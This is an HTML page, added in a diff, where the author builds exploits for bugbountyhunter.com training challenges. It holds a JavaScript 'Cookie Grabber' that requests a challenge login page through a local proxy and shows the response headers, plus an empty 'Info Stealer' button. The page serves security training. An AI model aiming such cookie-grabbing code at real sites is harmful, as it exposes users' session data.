@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>BugBountyHunter Free Challenges</title>
+        <meta name="description" content>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href>
+    </head>
+    <body id="container">
+        <container>
+        <h1>BugBountyHunter Free Challenges</h1>
+
+        <div class="description-box">
+            <p>
+                This html document serves as the place I build exploits to solve various webapp challenges at bugbountyhunter.com on my journey to get hands on experience with WebApp Pentesting*. 
+            </p>
+        </div>
+        
+        <h2>
+            <a href="https://www.bugbountyhunter.com/training/#vtab-extended1">
+                Newcomer Challenges
+            </a>
+        </h2>
+
+        <h3>
+            <a href="https://www.bugbountyhunter.com/challenge?id=15">
+                Can you obtain the sensitive information somehow?
+            </a>
+            <span class="label">
+                Misc / Application Logic
+            </span>
+        </h3>
+
+        <script>
+            function testcallback(data) {
+                console.log('Calling back')
+            }
+            function challenge15_cookie(callback) {
+                var xhr1 = new XMLHttpRequest();
+                xhr1.timeout = 10000;
+                let data = {
+                    headers: {
+                        Accept: "application/json",
+                        Origin: "https://www.bugbountytraining.com/"
+                    },
+                    method: 'GET'
+                }
+                xhr1.onreadystatechange = function(e) {
+                    if (xhr1.readyState === 4) {
+                        if (xhr1.status === 200) {
+                            callback(null, xhr1.response);
+                            const headers = xhr1.getAllResponseHeaders();
+                            const arr = headers.trim().split(/[\r\n]+/)
+                            cookie15.innerHTML = arr;
+                        } else {
+                            callback(xhr1.status, null)
+                        }
+                    }
+                }
+                xhr1.ontimeout = function () {
+                    console.log('XHR Timeout')
+                }
+                xhr1.open("POST", "http://localhost:2000/?url=https://www.bugbountytraining.com/challenges/challenge-15login.php", true);              
+                xhr1.setRequestHeader("Content-Type", "application/json");
+                xhr1.send(JSON.stringify(data));
+            }
+        </script>
+
+        <div class="solution">
+            <div class="button-box">
+                <span>
+                    <form action="" method="">
+                        <input type="button" onclick="challenge15_cookie(testcallback)" value="1. Cookie Grabber" />
+                    </form>
+                    <p id="cookie15"></p>
+                </span>
+                <span>
+                    <form action="" method="">
+                        <input type="button" onclick="" value="2. Info Stealer" />
+                    </form>
+                </span>
+            </div>
+        </div>
+
+        <h2>
+            <a href="https://www.bugbountyhunter.com/training/#vtab-extended2">
+                Level up your hacking
+            </a>
+        </h2>
+    </container>
+    </body>
+    <style>
+        /* General body styling */
+        body {
+            background-color: #333; /* Dark gray background */
+            color: #fff; /* White text */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        container {
+            max-width: 800px;
+            padding: 20px;
+            text-align: left;
+        }
+
+        /* Header styling */
+        h1, h2 {
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        h3 {
+            padding-left: 30px;
+        }
+
+        .solution {
+            padding-left: 60px;
+        }
+
+        .label {
+            display: inline-block;
+            padding: .25em .4em;
+            font-size: 75%;
+            font-weight: 700;
+            line-height: 1;
+            text-align: center;
+            white-space: nowrap;
+            vertical-align: baseline;
+            border-radius: .25rem;
+            color: #fff;
+            background-color: #28a745;
+        }
+
+        /* Link (a tag) styling */
+        a {
+            color: #98cbff; /* Dodger blue for links */
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Description box styling */
+        .description-box {
+            background-color: #444; /* Slightly lighter gray */
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Button container styling */
+        .button-box {
+            background-color: #555; /* Slightly lighter than description box */
+            padding: 20px;
+            border-radius: 8px;
+            display: inline-block;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Button styling */
+        button {
+            background-color: #1e90ff; /* Dodger blue */
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1c86ee; /* Slightly darker blue on hover */
+        }
+
+    </style>
+</html>
+
